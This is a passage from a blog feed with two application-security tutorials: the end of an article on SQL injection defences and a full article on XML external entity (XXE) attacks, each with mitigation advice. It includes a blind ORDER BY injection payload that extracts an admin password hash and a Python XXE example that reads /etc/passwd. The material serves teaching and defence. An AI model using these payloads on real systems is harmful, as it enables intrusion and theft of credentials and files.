&lt;span class="n"&gt;Session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;session&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"foo"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;"bar"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here we pass the name and password parameters to the ORM (SQL Alchemy). It takes care of sanitizing the name and the password.&lt;/p&gt;
&lt;p&gt;The third option is to create a &lt;a href="https://en.wikipedia.org/wiki/Prepared_statement"&gt;prepared statement&lt;/a&gt;. This is also using parameter binding but on the side of the SQL server. I think those are typically harder to use from a developers' perspective.&lt;/p&gt;
&lt;p&gt;Doing any of those three options is nice, but it is not enough. You want to be sure that you or anybody else doesn&amp;rsquo;t accidentally add code that is vulnerable to SQL injections. For this reason, static application security testing tools (SAST) like &lt;a href="https://pypi.org/project/bandit/"&gt;bandit&lt;/a&gt; check for potential SQL injection vulnerabilities (&lt;a href="https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html"&gt;source&lt;/a&gt;). Insert that in your CI pipeline and stay safe!&lt;/p&gt;
&lt;p&gt;The principles are the same for any programming language, but you might be interested in seeing more concrete advice in the language that is relevant to you. Have a look at &lt;a href="https://bobby-tables.com/"&gt;bobby-tables.com&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id="creative-sql-injections"&gt;Creative SQL Injections&lt;/h2&gt;
&lt;p&gt;There are some SQL Injections that are less trivial than the before mentioned examples.&lt;/p&gt;
&lt;h3 id="simplifying-queries"&gt;Simplifying Queries&lt;/h3&gt;
&lt;p&gt;An attacker might not know exactly how a query continues. So the attacker
inserts &lt;code&gt;--&lt;/code&gt; at the end to make the rest of the query a comment.&lt;/p&gt;
&lt;h3 id="information-gathering"&gt;Information Gathering&lt;/h3&gt;
&lt;p&gt;An attacker might not know the structure of the database. However, many
databases have a special table that contains the information. For MySQL,
MariaDB, and Postgres it is called &lt;code&gt;information_schema&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s possible to restrict access to that table
(&lt;a href="https://dba.stackexchange.com/a/25668/25983"&gt;example&lt;/a&gt;). You should do it from
a defense-in-depth perspective.&lt;/p&gt;
&lt;h3 id="order-by"&gt;Order By&lt;/h3&gt;
&lt;p&gt;You might be tempted to think that the following SQL query is secure because
the user input is just in the ORDER BY clause:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;book_title&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;books&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ORDER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;BY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="n"&gt;user_input&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;where the developer expects &lt;code&gt;user_input&lt;/code&gt; to be either &lt;code&gt;sales&lt;/code&gt; or
&lt;code&gt;average_review&lt;/code&gt;. However, an attacker could change &lt;code&gt;user_input&lt;/code&gt; to this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CASE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHEN&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;users&lt;/span&gt;
&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;"admin"&lt;/span&gt;
&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;"a"&lt;/span&gt;
&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;THEN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sales&lt;/span&gt;
&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="k"&gt;ELSE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;average_review&lt;/span&gt;
&lt;span class="k"&gt;END&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;ASC&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This way the attacker can get the password hash of the admin user. Character by
character. Just by looking at how the sorting changes.&lt;/p&gt;
&lt;h2 id="see-also_1"&gt;See also&lt;/h2&gt;
&lt;p&gt;I love &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; and &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; and they made a video about the topic!&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/_jKylhJtPmI" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category></entry><entry><title>XXE attacks üòà</title><link href="https://martin-thoma.com/https://medium.com/faun/xxe-attacks-750e91448e8f" rel="alternate"></link><published>2020-05-17T20:00:00+02:00</published><updated>2020-05-17T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-05-17:/https://medium.com/faun/xxe-attacks-750e91448e8f</id><summary type="html">&lt;p&gt;XML is probably the most commonly used markup language. It&amp;rsquo;s organized around tags &lt;code&gt;&amp;lt;example&amp;gt;foo&amp;lt;/example&amp;gt;&lt;/code&gt; and allows pretty complicated structures&lt;/p&gt;
&lt;p&gt;One interesting property about XML is that you can reference external entities, e.g. you can include another file. That is where the name XXE comes from: &lt;strong&gt;X ‚Ä¶&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;XML is probably the most commonly used markup language. It&amp;rsquo;s organized around tags &lt;code&gt;&amp;lt;example&amp;gt;foo&amp;lt;/example&amp;gt;&lt;/code&gt; and allows pretty complicated structures&lt;/p&gt;
&lt;p&gt;One interesting property about XML is that you can reference external entities, e.g. you can include another file. That is where the name XXE comes from: &lt;strong&gt;X&lt;/strong&gt;ML e&lt;strong&gt;x&lt;/strong&gt;ternal &lt;strong&gt;e&lt;/strong&gt;ntities. Let&amp;rsquo;s start!&lt;/p&gt;
&lt;h2 id="why-you-should-care"&gt;Why you should care&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;XXE vulnerabilities can allow attackers to &lt;strong&gt;steal your data&lt;/strong&gt;, &lt;strong&gt;scan your internal network&lt;/strong&gt;, and even allow &lt;strong&gt;remote code execution&lt;/strong&gt; (RCE)&lt;/li&gt;
&lt;li&gt;XXE attacks were number 4 in the &lt;strong&gt;OWASP Top 10&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The &lt;a href="https://twitter.com/hashtag/XXE?src=hashtag_click"&gt;Twitter Tag #XXE&lt;/a&gt; is pretty active. So people are still interested in it, although the vulnerability was first recognized already in 2002 (&lt;a href="https://www.securityfocus.com/archive/1/303509"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2012: An XXE vulnerability was discovered in &lt;strong&gt;Inkscape&lt;/strong&gt; (&lt;a href="https://bugs.launchpad.net/inkscape/+bug/1025185"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2014: &lt;strong&gt;Google&lt;/strong&gt; was vulnerable to XXE and paid a bug bounty of &lt;strong&gt;$10,000&lt;/strong&gt; (&lt;a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2014: &lt;strong&gt;Adobe Reader&lt;/strong&gt; had an XXE vulnerability (&lt;a href="https://www.cvedetails.com/cve/CVE-2014-8452/"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2015: Mohamed Ramadan discovered an XXE vulnerability in &lt;strong&gt;Facebooks&lt;/strong&gt; resume upload (&lt;a href="https://securityaffairs.co/wordpress/31677/hacking/hacking-facebook-word-document.html"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;2020: &lt;strong&gt;IBM QRadar&lt;/strong&gt; had an XXE vulnerability (&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4510"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="we-dont-use-xml"&gt;We don&amp;rsquo;t use XML!&lt;/h2&gt;
&lt;p&gt;Here are some indicators that you might need to care:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You&amp;rsquo;re using &lt;a href="https://en.wikipedia.org/wiki/SOAP"&gt;SOAP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You&amp;rsquo;re using &lt;a href="https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language"&gt;SAML&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You&amp;rsquo;re reading office files, such as Word (docx) or &lt;a href="https://en.wikipedia.org/wiki/Office_Open_XML"&gt;Excel files&lt;/a&gt; (xlsx; &lt;a href="https://github.com/StefanMichielse/generate_xxe_payloads"&gt;example&lt;/a&gt;, &lt;a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10"&gt;example&lt;/a&gt;). Powerpoint (pptx) contains XML as well. All of them are essentially ZIP archives with lots of XML files inside. I don&amp;rsquo;t think that Word / Excel / Powerpoint are vulnerable, but maybe the smaller libraries around those files that are used to programmatically create or read them.&lt;/li&gt;
&lt;li&gt;You&amp;rsquo;re reading &lt;a href="https://en.wikipedia.org/wiki/Extensible_Metadata_Platform"&gt;XMP meta data&lt;/a&gt; from images such as JPG or GIF (&lt;a href="https://www.youtube.com/watch?v=LZUlw8hHp44"&gt;presentation&lt;/a&gt;, &lt;a href="https://www.blackhat.com/docs/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.pdf"&gt;slides&lt;/a&gt;), meta data from audio and video files as well.&lt;/li&gt;
&lt;li&gt;You&amp;rsquo;re reading PDF files&lt;/li&gt;
&lt;li&gt;SVGs are XML as well.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;a href="https://github.com/BuffaloWill/oxml_xxe"&gt;oxml_xxe tool&lt;/a&gt; makes it pretty easy to generate such a malicious file.&lt;/p&gt;
&lt;h2 id="types-of-xxes"&gt;Types of XXEs&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Inband: The output is shown to the attacker&lt;/li&gt;
&lt;li&gt;Out of band (OOB): The attacker is blind&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="inband-xxe"&gt;Inband XXE&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;lxml&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;

&lt;span class="n"&gt;xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"""&amp;lt;root&amp;gt;Hello World!&amp;lt;/root&amp;gt;"""&lt;/span&gt;
&lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;XMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;doc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromstring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;parsed_xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tostring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf8"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;parsed_xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Looks harmless, doesn&amp;rsquo;t it? It simply prints &lt;root&gt;Hello World!&lt;/root&gt;&lt;/p&gt;
&lt;p&gt;But if you change the xml string, then you can read the users passwords:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;lxml&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;

&lt;span class="n"&gt;xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"""&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;!DOCTYPE XML [&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;!ENTITY ee SYSTEM "file:///etc/passwd" &amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;]&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;root&amp;gt;&amp;amp;ee;&amp;lt;/root&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;"""&lt;/span&gt;
&lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;XMLParser&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;doc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromstring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;parsed_xml&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tostring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;doc&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"utf8"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;parsed_xml&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If this was part of a server, then the user could read arbitrary files on that
server.&lt;/p&gt;
&lt;h3 id="out-of-band-xxe"&gt;Out-of-Band XXE&lt;/h3&gt;
&lt;p&gt;Most of the time, the attacker cannot see the result of the parsed XML file
directly. Hence inband XXE is not possible. And maybe errors are also captured,
so an error-based XXE does also not work.&lt;/p&gt;
&lt;p&gt;However, the attacker might be able to force the server to make HTTP calls.
This is called server-side request forgery (SSRF). Then the attacker sets up a
listener, forces the server to make a request, and thus confirms that XXE is
possible. The Attack looks similar to the lines above and is pretty well
explained here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/"&gt;Out-of-band XML External Entity (OOB-XXE)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://portswigger.net/web-security/xxe/blind"&gt;What is a blind XXE attack? Tutorial &amp;amp; Examples&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="mitigations_1"&gt;Mitigations&lt;/h2&gt;
&lt;p&gt;The simplest mitigation is to limit the capabilities of XML to a safe subset.
Meaning that you need to limit the XML parser you&amp;rsquo;re using.&lt;/p&gt;
&lt;p&gt;Python has &lt;a href="https://docs.python.org/3/library/xml.html#xml-vulnerabilities"&gt;5 XML
parsers&lt;/a&gt;:
&lt;a href="https://docs.python.org/3/library/xml.sax.reader.html#module-xml.sax.xmlreader"&gt;sax&lt;/a&gt;,
etree, minidom, pulldom, xmlrpc. According to the documentation, they are safe
to use. However, &lt;a href="https://lxml.de/"&gt;lxml&lt;/a&gt; is wide-spread. It mentions that you
should configure the XML to not load external DTDs
(&lt;a href="https://lxml.de/FAQ.html#how-do-i-use-lxml-safely-as-a-web-service-endpoint"&gt;source&lt;/a&gt;).
The &lt;a href="https://pypi.org/project/defusedxml/"&gt;defusedxml&lt;/a&gt; package offers a way to
access XML parsers with a secure default configuration.&lt;/p&gt;
&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
&lt;p&gt;I would like to point you to this YouTube video by PwnFunction. It summarizes
the topic very well.&lt;/p&gt;
&lt;p&gt;If you&amp;rsquo;re interested in a summary over different XML parsers, try &lt;a href="https://www.usenix.org/system/files/conference/woot16/woot16-paper-spath.pdf"&gt;SoK: XML
Parser
Vulnerabilities&lt;/a&gt;
(2016) by Christopher Sp&amp;auml;th, Christian Mainka, Vladislav Mladenov, J&amp;ouml;rg
Schwenk.&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/gjm6VHZa_8s" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
